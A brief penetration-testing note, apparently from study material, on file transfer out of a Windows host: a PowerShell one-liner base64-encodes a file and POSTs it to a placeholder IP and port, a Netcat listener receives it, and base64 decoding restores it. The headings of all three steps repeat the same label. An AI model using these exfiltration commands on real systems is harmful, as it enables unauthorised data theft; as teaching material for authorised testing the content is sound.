PowerShell Base64 Web Upload


Another way to use PowerShell and base64 encoded files for upload operations is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.

1) PowerShell Script to Upload a File to Python Upload Server

$b64 = [System.convert]::ToBase64String((Get-Content -Path '<Path>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64

2) PowerShell Script to Upload a File to Python Upload Server

nc -lvnp 8000

3)  PowerShell Script to Upload a File to Python Upload Server

echo <base64> | base64 -d -w 0 > hosts